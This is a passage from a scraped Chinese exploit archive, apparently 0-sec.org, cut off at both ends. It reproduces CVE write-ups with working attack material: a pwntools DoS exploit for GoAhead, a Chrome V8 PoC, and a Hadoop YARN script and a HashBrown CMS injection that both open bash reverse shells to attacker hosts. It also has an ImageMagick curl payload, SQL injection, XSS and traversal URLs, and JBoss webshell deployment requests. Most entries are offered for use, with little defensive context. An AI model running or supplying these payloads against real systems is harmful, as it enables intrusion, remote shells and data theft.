经过笔者的分析发现，freeUploadFile（）函数会在/src/upload.c的websFreeUpload（）函数中调用，而websFreeUpload（）函数会在/src/http.c中调用，/src/http.c中termWebs（）函数会调用websFreeUpload（）函数，/src/http.c中reuseConn（）函数会调用termWebs（）函数，从中可以看出漏洞触发函数freeUploadFile（）的调用过程。 在函数freeUploadFile（）的调用过程中，查看源码可发现有两行如下代码： / src/upload.c / 255 freeUploadFile(wp->currentFile); 256 file = wp->currentFile = walloc(sizeof(WebsUpload)); 在此处变量 wp->currentFile会被free一次，但是被free的变量wp->currentFile在代码： / src/upload.c / 371 hashEnter(wp->files, wp->uploadVar, valueSymbol(file), 0); 372 defineUploadVars(wp); 在此处代码中把变量wp->currentFile加入了一个数组中，该数组中的变量在接下来的代码中会被free一次，free代码如下： / src/upload.c / 86 for (s = hashFirst(wp->files); s; s = hashNext(wp->files, s)) { 87 up = s->content.value.symbol; 88 freeUploadFile(up); 变量wp->currentFile再次被free之后，导致了double-free漏洞触发，是fastbin double free，利用方法和思路已经很成熟。 poc https://github.com/ianxtianxt/CVE-2019-5096-GoAhead-Web-Server-Dos-Exploit from pwn import * import time import sys r = remote(sys.argv[1],8080) rn = b\"\\r\\n\" payload=b'' payload +=b\"--siiit\"+rn payload +=b\"Content-Disposition: form-data; name=\\\"shit1\\\"; filename=\\\"shit.file\\\";\"+rn payload+= rn payload+=b\"HelloWorld!\"+rn payload +=b\"--siiit\"+rn payload +=b\"Content-Disposition: form-data; name=\\\"shit2\\\"; filename=\\\"shit2.file\\\"\"+rn payload+= rn payload+=b\"FuckkWorld!\"+rn payload +=b\"--siiit\"+rn data = b\"POST / HTTP/1.1\\r\\nHost:HelloWorld:8080\\r\\n\" data +=b\"content-type:multipart/form-data\"+rn data +=b\"content-type:boundary=siiit\"+rn data +=b\"content-length:\"+str(len(payload)).encode()+rn data +=b\"cookie:\"+b'a'*0x1+rn data +=rn data +=payload r.send(data) sleep(20) try: dat=r.recvn(1024) print(dat) r.close() except: r.close() 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 00:53:57 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Google/CVE-2019-5786.html":{"url":"0day/Google/CVE-2019-5786.html","title":"（CVE-2019-5786）Chrome 远程代码执行漏洞","keywords":"","body":"（CVE-2019-5786）Chrome 远程代码执行漏洞 一、漏洞简介 攻击者利用该漏洞配合一个win32k.sys的内核提权（CVE-2019-0808 ）可以在win7上穿越Chrome沙箱 二、漏洞影响 72.0.3626.121或更高版本 三、复现过程 测试环境为： win7 x86 谷歌浏览器版本为72.0.3626.119 这里看一下参数说明 设置lhost为我们的本机ip 执行exploit之后，会返回一个链接 只要被攻击者访问了这个链接，就会触发漏洞，返回session 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-03 14:18:37 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Google/CVE-2020-6418.html":{"url":"0day/Google/CVE-2020-6418.html","title":"（CVE-2020-6418）Chrome 远程代码执行漏洞","keywords":"","body":"（CVE-2020-6418）Chrome 远程代码执行漏洞 一、漏洞简介 在Google Chrome浏览器80.0.3987.122以下与Microsoft Edge浏览器80.0.361.62以下的版本中，开源JavaScript和WebAssembly引擎V8中存在一个类型混淆漏洞（CVE-2020-6418），可能导致攻击者非法访问数据，从而执行恶意代码。 二、漏洞影响 Google Chrome浏览器80.0.3987.122以下与Microsoft Edge浏览器80.0.361.62以下的版本中 三、复现过程 poc ITERATIONS = 10000 TRIGGER = false function f(a,p){ return a.pop(Reflect.construct(function(){}, arguments, p)) } let a; let p = new Proxy(Object, { get: function(){ if (TRIGGER){ a[2] = 1.1; } return Object.prototype; } }); for(let i = 0; i CVE-2020-6418 PoC! 参考链接 https://github.com/ChoKyuWon/CVE-2020-6418/blob/master/poc.html 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-09 12:43:58 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Hadoop/1.html":{"url":"0day/Hadoop/1.html","title":"Hadoop未授权访问","keywords":"","body":"Hadoop未授权访问 一、漏洞简介 Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的 MapReduce 算法进行分布式处理。这个框架被Adobe，Last fm，EBay，Yahoo等知名公司使用着。它极大地精简化程序员进行分布式计算时所需的操作，用户大概通过如下步骤在hadoop中实现分布式处理： 用户创建一个处理键值的map函数 产生了一套中间键/值 reduce函数合并中间值并把他们关联到对应的键 二、影响范围 三、复现过程 1. 扫描探测 1.1 常见端口 1.2 敏感端口 模块 节点 默认端口 HDFS NameNode 50070 HDFS SecondNameNode 50090 HDFS DataNode 50075 HDFS Backup/Checkpoint node 50105 MapReduce JobTracker 50030 MapReduce TaskTracker 50060 通过访问 NameNode WebUI 管理界面的 50070 端口，可以下载任意文件。而且，如果 DataNode 的默认端口 50075 开放，攻击者可以通过 HDSF 提供的 restful API 对 HDFS 存储的数据进行操作。 2. 攻击手法 利用方法和原理中有一些不同。在没有 hadoop client 的情况下，直接通过 REST API 也可以提交任务执行。 利用过程如下： 在本地监听等待反弹 shell 连接 调用 New Application API 创建 Application 调用 Submit Application API 提交 P牛的攻击脚本 ##!/usr/bin/env python import requests target = 'http://127.0.0.1:8088/' lhost = '192.168.0.1' ## put your local host ip here, and listen at port 9999 url = target + 'ws/v1/cluster/apps/new-application' resp = requests.post(url) app_id = resp.json()['application-id'] url = target + 'ws/v1/cluster/apps' data = { 'application-id': app_id, 'application-name': 'get-shell', 'am-container-spec': { 'commands': { 'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost, }, }, 'application-type': 'YARN', } requests.post(url, json=data) 3. 防范措施 网络访问控制 使用 安全组防火墙 或本地操作系统防火墙对访问源 IP 进行控制。如果您的 Hadoop 环境仅对内网服务器提供服务，建议不要将 Hadoop 服务所有端口发布到互联网。 启用认证功能 启用 Kerberos 认证功能。 更新补丁 不定期关注 Hadoop 官方发布的最新版本，并及时更新补丁。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Harbor/1.html":{"url":"0day/Harbor/1.html","title":"（CVE-2019-16097）Harbor未授权创建管理员漏洞","keywords":"","body":"（CVE-2019-16097）Harbor未授权创建管理员漏洞 一、漏洞简介 近日，镜像仓库Harbor爆出任意管理员注册漏洞，攻击者在请求中构造特定字符串，在未授权的情况下可以直接创建管理员账号，从而接管Harbor镜像仓库。我们得到消息，第一时间对该漏洞进了验证，官方已发布公告说明，最新的1.7.6和1.8.3已修复此漏洞，请使用到的用户尽快升级至安全版本。 Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器。Harbor 1.7.0版本至1.8.2版本中的core/api/user.go文件存在安全漏洞。攻击者通过在请求中添加关键参数，即可利用该漏洞创建管理员账户，从而接管Harbor镜像仓库。 二、影响范围 Harbor 1.7.0版本至1.8.2 三、复现过程 https://github.com/ianxtianxt/CVE-2019-16097 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-10-29 13:13:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Hashbrown CMS/CVE-2020-6948.html":{"url":"0day/Hashbrown CMS/CVE-2020-6948.html","title":"（CVE-2020-6948）HashBrown CMS 远程命令执行漏洞","keywords":"","body":"（CVE-2020-6948）HashBrown CMS 远程命令执行漏洞 一、漏洞简介 HashBrown CMS是一套开源的无头内容管理系统（CMS）。 HashBrown CMS 1.3.3及之前版本中存在远程代码执行漏洞，该漏洞源于程序没有进行正确的安全检查。攻击者可利用该漏洞执行代码。 二、漏洞影响 HashBrown CMS 1.3.3 三、复现过程 在之前收集的资料里面总结了发现漏洞基本有三个方法： 通过关键字搜索，比如exec方法在很多语言里面代表执行系统命令，那你就可以搜索查看传入exec方法的参数有没有经过过滤，有没有办法利用。https://github.com/wireghoul/graudit 这个项目就罗列了很多语言的关键词可以用作参考。 根据function来阅读代码，但是这种方法花费的时间比第一种多，有可能迷失在各种各种各样的方法中。 通读代码，这样最全，但是显然速度要慢很多了。 对于Hashbrown CMS，先用第一种方法开路。尝试了几个关键字之后我选取了exec这个关键字。在grep 之后发现了下面的结果。 看来这个应用使用git 相关命令，如果可以传入url 参数就有可能触发命令执行漏洞。接着打开Server/Entity/Deployer/GitDeployer.js 文件查看源代码。 其中可以看到url由username，password，和repro 几个变量拼接，而且其中没有过滤特殊的字符和命令。那接下来就是到页面里面寻找触发的点。经过对这个应用的一番熟悉，得知可以在登录后建立新的connection选择git部署的方式，在Repository，Branch，username或者password字段填写你要执行的命令即可。但是这里要注意程序本来的exec命令中填写有单引号，我们要对其进行闭合，比如填入如下命令来反弹一个shell。 https://google.com' & /bin/bash -c 'bash -i >& /dev/tcp/192.168.119.149/8888 0>&1 配置如下： 然后点击media菜单触发git命令执行 接下来在监听的机器上就可以获得shell了 参考链接 https://mp.weixin.qq.com/s?__biz=MjM5MDYxODkyMA==&mid=2651345793&idx=1&sn=02381bb3dbd4679b12be4628d665e815&chksm=bdbef7c68ac97ed063e8df46a42e2a111dfd52f108f6b267f8dfc183b6b0ed3f87b6af757487&mpshare=1&scene=1&srcid=&sharer_sharetime=1582514363054&sharer_shareid=346bf064ccfaeb680ec3e1af3a4fc9a8&key=019d47c25aa835ac2d58a398c473737e01644761ca991f7009ada9eb1ef69e4dd41b2008c27db720006e0858455f920d0801d9feae53aa4314f05d6e310a7290ae2b93e17343c13f6a9f2ce360254195&ascene=1&uin=MTU0OTU5NDkzMA%3D%3D&devicetype=Windows+10&version=62080079&lang=zh_CN&exportkey=AZc%2BxZJwp8CueCtaKThWQrI%3D&pass_ticket=l4uNHDrGwGqrS%2BmJVv56i4FzemghweUeBbN1BEETCGd3TqEDSTcwvRMSxogubM8j 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-24 20:58:18 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Hashbrown CMS/CVE-2020-6949.html":{"url":"0day/Hashbrown CMS/CVE-2020-6949.html","title":"（CVE-2020-6949）HashBrown CMS postUser 函数存在提权漏洞","keywords":"","body":"（CVE-2020-6949）HashBrown CMS postUser 函数存在提权漏洞 一、漏洞简介 HashBrown CMS是一套开源的无头内容管理系统（CMS）。 HashBrown CMS 1.3.3及之前版本中的‘postUser’函数存在提权漏洞。攻击者可利用该漏洞修改管理员账户的哈希密码或重置该账户。 二、漏洞影响 HashBrown CMS 1.3.3及之前版本 三、复现过程 在读和部分此cms的源码后，希望对用户管理方面做个审计。这款CMS 的用户分为两种，一种是admin 权限用户， 可以创建和设置别的用户的属性，比如参管理那些项目，用户名密码设置等等。另外一种是editor 账户，其能管理哪些项目是由admin 设置的，editor 账户只能修改自己的用户名和密码。如下图这里的三个账户，admin 和 aaaa 是admin 用户，bbbb 是editor 账户 由于该CMS 不提供用户注册和找回密码的功能， 所以没有太多的地方可以去尝试突破，我就尝试聚焦有没有办法把editor 账户提权成admin 账户，那editor 账户只有一个地方可以修改自己的密码和其他属性。 随意做个修改后在burpsuit 截取请求如下。 POST http://10.200.159.166:8080/api/users/44019b092718ccde HTTP/1.1 Host: 10.200.159.166:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/json; charset=utf-8 Content-Length: 159 Cookie: token=2e10b7f6b3cc8fbf81452d980029d6e843ac5760 {\"id\":\"44019b092718ccde\",\"viewedBy\":\"\",\"viewedOn\":null,\"isAdmin\":false,\"isCurrent\":false,\"username\":\"bbbb\",\"fullName\":\"bbbb\",\"email\":\"\",\"theme\":\"\",\"scopes\":{}} Grep 定位到文件Server/Controller/UserController.js root@SIN-Ubuntu-A:~/hashbrown-cms/hashbrown-cms-1.3.1/src# grep /api/users/ * -r Server/Controller/UserController.js: app.get('/api/users/:id', this.middleware({needsAdmin: true, setProject: false}), this.getUser); Server/Controller/UserController.js: app.post('/api/users/first', this.createFirstAdmin); Server/Controller/UserController.js: app.post('/api/users/new', this.middleware({setProject: false, needsAdmin: true}), this.createUser); Server/Controller/UserController.js: app.post('/api/users/:id', this.middleware({setProject: false}), this.postUser); Server/Controller/UserController.js: app.delete('/api/users/:id', this.middleware({setProject: false, needsAdmin: true}), this.deleteUser); 其中的postUser function, 其中可看到该函数在151行会对cookie 里面的token 进行验证，在153 行获取user 的scope。Scope 这里指的就是是不是admin 用户，可以管理那些项目。但是这里有个要注意的地方148行的req.params.id 是post 内容里面json id字段的值，但是155行的user.id 是url 末段的id值。对于editor 用户来说应该永远一直，因为editor只能修改自己账户。Admin 用户有可能不一样，因为admin 用户是可修改其他账户的。我们可以看到156到159行是做了安全性检察的，如果当前user id 获取的属性没有users 的scope（不是admin 权限账户），那就用数据库里面的属性覆盖当前post提交内容的isAdmin 和scopes 两个内容，保证不会让editor 自己提权到admin 账户。到此没有看到对其他post 提交内容做检察。之后168行用查询id的方式对响应的条目做修改。 此时如果我们在数据库中查看的话可以有个更清晰的认识，如果第一个条目是aaaa账户，isadmin设置为true，第二个是admin账户，第三个是bbbb账户，每个账户password 字段包含hash，salt 和token字段。 这里我产生了一个想法，如果我是bbbb账户，提交修改自己账户请求的时候写入的是aaaa账户的id会发生什么样的事情呢？但是做这件事之前我们要先确定bbbb账户有没有办法得到aaaa账户的id。在阅读/Server/Controller/UserController.js源码后确实是可以的。如下31行，发送get 请求到API可以获取到当前项目的所有用户，包括所有的admin 账户。而项目id 等是当管理员赋予editor权限后，登录后从请求中就可以拿到的。 发送请求得到账户的信息。 那接下来我们就可以篡改bbbb发送修改自己账户的请求，但是post提交的id是aaaa账户。如下图保持了url最后一段是bbbb自己的id，post 提交的id是aaaa 账户，显示200 ok。 此时如果查看数据库会看到确实aaaa和bbbb 条目的id一样，但是bbbb 的内容并没有实际的改变，只是换了一个id。对别的账户也没有任何的修改。 但其实如果我们再深一步就会发现这有利用的点。在之前的源码中168行HashBrown.Service.UserService.updateUserById(id, properties); 使用了查询匹配id做修改的方式。我们追踪这个函数。在文件Server/Service/UserService.js中看到mergeOne的数据库操作方式。这意味这如果aaaa和bbbb有相同的id，但是aaaa 在数据库的前面位置，如果bbbb提出对这个id 的修改，修改会被接受但是写入aaaa的条目。 接下来我们来做测试,提交的ID全部改成aaaa账户的id，因为现在原始的bbbb的id已经不存在了。还提交了aaaa 的fullname 和password 字段修改其密码是和bbbb同样的内容。 结果如下，可以看到aaaa的条目修改后接受了fullname，和password，isadmin和scopes 继承了bbbb的内容，这是因为前面源码中的156到159行的作用。 到此为止，我们虽然不能将bbbb账户自己提升成admin，但是可以去修改别的账户的关键参数包括密码，这无疑是一个用户权限的漏洞。经过相似的分析修改username 可以达到类似的效果。随后我提交此漏洞，开发人员征求了我的意见以后保证无法修改成同样的id或者username 来规避了这个问题。 参考链接 https://mp.weixin.qq.com/s?__biz=MjM5MDYxODkyMA==&mid=2651345793&idx=1&sn=02381bb3dbd4679b12be4628d665e815&chksm=bdbef7c68ac97ed063e8df46a42e2a111dfd52f108f6b267f8dfc183b6b0ed3f87b6af757487&mpshare=1&scene=1&srcid=&sharer_sharetime=1582514363054&sharer_shareid=346bf064ccfaeb680ec3e1af3a4fc9a8&key=019d47c25aa835ac2d58a398c473737e01644761ca991f7009ada9eb1ef69e4dd41b2008c27db720006e0858455f920d0801d9feae53aa4314f05d6e310a7290ae2b93e17343c13f6a9f2ce360254195&ascene=1&uin=MTU0OTU5NDkzMA%3D%3D&devicetype=Windows+10&version=62080079&lang=zh_CN&exportkey=AZc%2BxZJwp8CueCtaKThWQrI%3D&pass_ticket=l4uNHDrGwGqrS%2BmJVv56i4FzemghweUeBbN1BEETCGd3TqEDSTcwvRMSxogubM8j 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-24 20:59:24 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/ImageMagick/CVE-2016-3714.html":{"url":"0day/ImageMagick/CVE-2016-3714.html","title":"（CVE-2016-3714）ImageMagick 命令执行漏洞","keywords":"","body":"（CVE-2016-3714）ImageMagick 命令执行漏洞 一、漏洞简介 /etc/ImageMagick/delegates.xml 将%s，%l加入到command里造成了命令执行 二、漏洞影响 ImageMagick 6.5.7-8 2012-08-17(手工测试风险存在) ImageMagick 6.7.7-10 2014-03-06(手工测试风险存在) 低版本至6.9.3-9 released 2016-04-30 三、复现过程 poc push graphic-context viewbox 0 0 640 480 fill 'url(https://\"| command\")' pop graphic-context 图片上传点，抓包，附上exp代码： push graphic-context viewbox 0 0 640 480 fill 'url(https://\"| curl 172.16.20.108:8888\")' pop graphic-context ip：你要反弹的shell地址，2333端口号，服务器监听反弹shell。 nc -lvp ``8888 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 14:45:11 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Imcat/Imcatcms 4.2 后台文件包含getshell.html":{"url":"0day/Imcat/Imcatcms 4.2 后台文件包含getshell.html","title":" Imcatcms 4.2 后台文件包含getshell ","keywords":"","body":"Imcat 4.2 后台文件包含getshell 一、漏洞简介 Imcat cms（贴心猫）4.2 存在一个sql shell的功能上，通过这个sql shell功能也是可以直接getshell的，但是当mysql版本过高的时候，默认有些权限是禁止的，不好弄，不过在这个功能中存在本地文件包含， 所以还可以通过文件包含来进行getshell。 二、漏洞影响 Imcat 4.2 三、复现过程 漏洞分析 找到相应的sql shell功能对应的代码，存在问题的参数是$part，从代码中可以看到$part参数直接传入到include进行文件包含的，虽有两个if判断，但是这很容易就可进行绕过了进入文件包含语句中， 所以只要跟踪的$part参数的传入即可。 跟踪req()函数 继续跟进 最后跟进到这里，其实就是通过get/post等其他方式接收就好，而且并没有进行任何的过滤 漏洞复现 写好的图片格式的shell 找到上传文件的功能，这个在后台中肯定很多可以上传功能，比如上传图片的地方，并获取返回的地址。 然后就可以进入到sql shell的地方中随意执行sql语句就好 抓包，因为默认是没有$part这个参数的传入的，需要自行添加，然后指定到图片的文件地址即可。 备注：ins.dbsql 这个是用来的绕过两个if判断进入到if代码块中的。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 15:02:07 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Imcat/CVE-2018-20606.html":{"url":"0day/Imcat/CVE-2018-20606.html","title":" （CVE-2018-20606）Imcat 4.4 敏感信息泄露 ","keywords":"","body":"（CVE-2018-20606）Imcat 4.4 敏感信息泄露 一、漏洞简介 imcat是一套基于PHP的开源建站系统。 imcat 4.4版本中存在安全漏洞。攻击者可借助dev.php?tools-ipaddr&api=Pcoln&uip= URI利用该漏洞泄露完整路径。 二、漏洞影响 imcat 4.4 三、复现过程 如果您尚未安装相关的插件，则可以访问http://www.0-sec.org/dev.php?tools-ipaddr&api=Pcoln&uip=137.36.58.213。错误获取绝对路径信息。 参考链接 https://github.com/AvaterXXX/CVEs/blob/master/imcat.md 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-02 01:24:28 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Imcat/CVE-2018-20607.html":{"url":"0day/Imcat/CVE-2018-20607.html","title":" （CVE-2018-20607）Imcat 4.4 敏感信息泄露 ","keywords":"","body":"（CVE-2018-20607）Imcat 4.4 敏感信息泄露 一、漏洞简介 imcat是一套基于PHP的开源建站系统。 imcat 4.4版本中存在安全漏洞。远程攻击者可借助root/tools/adbug/binfo.php URI利用该漏洞获取敏感的调试信息。 二、漏洞影响 imcat 4.4 三、复现过程 `http://www.0-sec.org/root/tools/adbug/binfo.php` 参考链接 https://github.com/AvaterXXX/CVEs/blob/master/imcat.md 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-02 01:24:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Imcat/CVE-2018-20608.html":{"url":"0day/Imcat/CVE-2018-20608.html","title":" （CVE-2018-20608）Imcat 4.4 敏感信息泄露 ","keywords":"","body":"（CVE-2018-20608）Imcat 4.4 敏感信息泄露 一、漏洞简介 imcat是一套基于PHP的开源建站系统。 imcat 4.4版本中存在安全漏洞。远程攻击者可借助root/tools/adbug/binfo.php?phpinfo1 URI利用该漏洞获取信息。 二、漏洞影响 imcat 4.4 三、复现过程 http://www.0-sec.org/root/tools/adbug/binfo.php?phpinfo1 参考链接 https://github.com/AvaterXXX/CVEs/blob/master/imcat.md 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-02 01:24:33 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Imcat/CVE-2018-20609.html":{"url":"0day/Imcat/CVE-2018-20609.html","title":" （CVE-2018-20609）Imcat 4.4 敏感信息泄露 ","keywords":"","body":"（CVE-2018-20609）Imcat 4.4 敏感信息泄露 一、漏洞简介 imcat是一套基于PHP的开源建站系统。 imcat 4.4版本中存在安全漏洞。远程攻击者可借助root/tools/adbug/check.php URI利用该漏洞获取敏感的配置信息。 二、漏洞影响 imcat 4.4 三、复现过程 http://www.0-sec.org/root/tools/adbug/check.php 参考链接 https://github.com/AvaterXXX/CVEs/blob/master/imcat.md 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-02 01:24:35 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Imcat/CVE-2018-20610.html":{"url":"0day/Imcat/CVE-2018-20610.html","title":" （CVE-2018-20610）Imcat 4.4 敏感信息泄露 ","keywords":"","body":"（CVE-2018-20610）Imcat 4.4 敏感信息泄露 一、漏洞简介 imcat是一套基于PHP的开源建站系统。 imcat 4.4版本中的root/run/adm.php文件存在目录遍历漏洞。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。 二、漏洞影响 imcat 4.4 三、复现过程 先在D盘创建1.txt http://www.0-sec.org/root/run/adm.php?admin-ediy&part=edit&dkey=runs&dsub=&efile=../../1.txt&dialog=1546054963116&lang=cn 参考链接 https://github.com/AvaterXXX/CVEs/blob/master/imcat.md 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-02 01:24:38 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Imcat/CVE-2018-20611.html":{"url":"0day/Imcat/CVE-2018-20611.html","title":" （CVE-2018-20611）Imcat 4.4 xss ","keywords":"","body":"（CVE-2018-20611）Imcat 4.4 xss 一、漏洞简介 imcat是一套基于PHP的开源建站系统。 imcat 4.4版本存在跨站脚本漏洞。远程攻击者可通过向root/tools/adbug/binfo.php?cookie URI发送特制的cookie利用该漏洞注入任意的Web脚本或HTML。 二、漏洞影响 imcat 4.4 三、复现过程 将cookie的值修改成 \">alert(1) 然后访问 http://www.0-sec.org/root/tools/adbug/binfo.php?cookie` 参考链接 https://github.com/AvaterXXX/CVEs/blob/master/imcat.md 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-02 01:29:58 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/IonizeCMS/2.html":{"url":"0day/IonizeCMS/2.html","title":"（CVE-2017-5961）IonizeCMS xss","keywords":"","body":"（CVE-2017-5961）IonizeCMS xss 一、漏洞简介 该漏洞源于在‘path’HTTP GET参数传递到‘ionize-master/themes/admin/javascript/tinymce/jscripts/tiny_mce/plugins/codemirror/dialog.php’URL时，程序没有充分地过滤此参数中用户提交的数据。攻击者可利用该漏洞在浏览器中执行任意的HTML和脚本代码。 二、漏洞影响 三、复现过程 http://0-sec.org/testcmsofgithub/ionize-master/ionize-master/themes/admin/javascript/tinymce/jscripts/tiny_mce/plugins/codemirror/dialog.php?path=%22%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E%3Cscript%20%22 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-05 16:27:34 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/IonizeCMS/1.html":{"url":"0day/IonizeCMS/1.html","title":"IonizeCMS sql注入","keywords":"","body":"IonizeCMS sql注入 一、漏洞简介 二、漏洞影响 三、复现过程 伪造HTTP头注入 在抓包哇： X-Forwarded-Host: 'and(select 1 from(select count(*),concat((select concat(0x5e5e5e,version(),0x5e5e5e) from informat 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-05 16:26:35 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Jboss/JMX Console未授权访问Getshell.html":{"url":"0day/Jboss/JMX Console未授权访问Getshell.html","title":"JMX Console未授权访问Getshell","keywords":"","body":"JMX Console未授权访问Getshell 一、漏洞简介 二、漏洞影响 全版本 三、复现过程 先输入http://172.26.1.167:8080/jmx-console/null-console/进入到页面 先点击jboss.system,然后点击service=MainDeployer 创建一个war包 先准备好一个jsp的木马,然后打开cmd创建,输入命令:jar -cvf zfsn.war(你要创建war的名字，可随意填) zfsn. jsp 我们找到methodIndex为17 or 19的deploy，把远程的war包填入进去，进行远程war包的部署 部署完成之后,我们的木马地址为http://172.26.1.167/zfsn/zfsn.jsp 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-21 14:25:27 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Jboss/（CVE-2007-1036）JMX Console HtmlAdaptor Getshell.html":{"url":"0day/Jboss/（CVE-2007-1036）JMX Console HtmlAdaptor Getshell.html","title":"（CVE-2007-1036）JMX Console HtmlAdaptor Getshell","keywords":"","body":"（CVE-2007-1036）JMX Console HtmlAdaptor Getshell 一、漏洞简介 此漏洞主要是由于JBoss中/jmx-console/HtmlAdaptor路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。该漏洞利用的是后台中jboss.admin -> DeploymentFileRepository -> store()方法，通过向四个参数传入信息，达到上传shell的目的，其中arg0传入的是部署的war包名字，arg1传入的是上传的文件的文件名，arg2传入的是上传文件的文件格式，arg3传入的是上传文件中的内容。通过控制这四个参数即可上传shell，控制整台服务器。但是通过实验发现，arg1和arg2可以进行文件的拼接，例如arg1=she，arg2=ll.jsp。这个时候服务器还是会进行拼接，将shell.jsp传入到指定路径下 二、漏洞影响 全版本 三、复现过程 输入url:http://172.26.1.169:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin%3Aservice%3DDeploymentFileRepository,定位到store方法 传入相应的值，即可getshell 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-21 14:18:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Jboss/（CVE-2010-0738）JMX控制台安全验证绕过漏洞.html":{"url":"0day/Jboss/（CVE-2010-0738）JMX控制台安全验证绕过漏洞.html","title":"（CVE-2010-0738）JMX控制台安全验证绕过漏洞","keywords":"","body":"（CVE-2010-0738）JMX控制台安全验证绕过漏洞 一、漏洞简介 这个漏洞利用方法跟CVE-2007-1036一样，不过这个是绕过了get和post传输限制，利用head传输方式发送payload 二、漏洞影响 jboss4.2.0 and jboss 4.3.0 三、复现过程 因为跟上个漏洞利用差不多，只不过用了head传输方式，我这里就直接贴payload了 HEAD /jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodIndex=6&arg0=..%2Fjmx-console.war%2F&arg1=hax0rwin&arg2=.jsp&arg3=&arg4=True HTTP/1.1 Host: hostx:portx User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 (.NET CLR 3.5.30729) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Keep-Alive: 300 Proxy-Connection: keep-alive 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-21 13:17:23 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Jboss/Administration Console 弱口令 Getshell.html":{"url":"0day/Jboss/Administration Console 弱口令 